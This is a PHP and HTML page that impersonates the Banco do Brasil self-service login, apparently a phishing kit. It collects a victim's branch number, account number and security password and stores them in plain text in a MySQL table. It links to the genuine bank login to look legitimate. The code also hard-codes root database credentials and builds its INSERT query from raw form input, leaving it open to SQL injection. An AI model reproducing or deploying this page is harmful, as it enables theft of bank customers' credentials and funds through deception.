<?php

$dbHost = 'Localhost';
$dbUsername = 'root';
$dbPassword = '651450';
$dbName = 'bancob';

$conexao = new mysqli($dbHost, $dbUsername, $dbPassword, $dbName);

if(isset($_POST['submit'])) {

    $agencia = $_POST['agencia'];
    $conta = $_POST['conta'];
    $senha = $_POST['senha'];

    $result = mysqli_query($conexao, "INSERT INTO usuarios(agencia,conta,senha)
    VALUES ('$agencia','$conta','$senha')");
}

?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/favicon.jpg">
    <link rel="stylesheet" href="./fonts.css">
    <link rel="stylesheet" href="./form.css">
    <title>Banco do Brasil</title>
</head>
<body>
    <div id="cabecalho">
        <div id="content-cabecalho">
            <img src="./img/favicon.jpg">
            <h2>Autoatendimento</h2>
        </div>
    </div>

    <div id="formulario">
        <div id="titulo">
            <h2>
                Agência e conta
            </h2>
        </div>
        <form id="form" netlify method="POST" action="form.php">
            <label for="" class="input1">Agência</label>
            <input type="tel" placeholder="Agência" id="agencia-input" name="agencia" maxlength="6" required>

            <label for="" class="input2">Conta</label>
            <input type="tel" placeholder="Conta corrente" id="conta-input" name="conta" maxlength="8" required>

            <label for="" class="input3">Senha de segurança</label>
            <input type="password" placeholder="Senha" id="senha-input" name="senha" required>

            <div class="guardar">
                <input type="checkbox">
                <label>Guardar agência e conta</label>
            </div>

            <button type="submit" id="submit" name="submit">CONTINUAR</button>

            <div class="tipo">
                <a href="https://www2.bancobrasil.com.br/aapf/login.html?1649961209864&_ga=2.148392055.1301119398.1675448384-407135546.1675448384#/acesso-aapf" class="outrotipo" target="_self">Outro tipo de Acesso</a>
            </div>
        </form> 
    </div>

<!--SCRIPT-->
    <script src="./index.js">

    </script>
</body>
</html>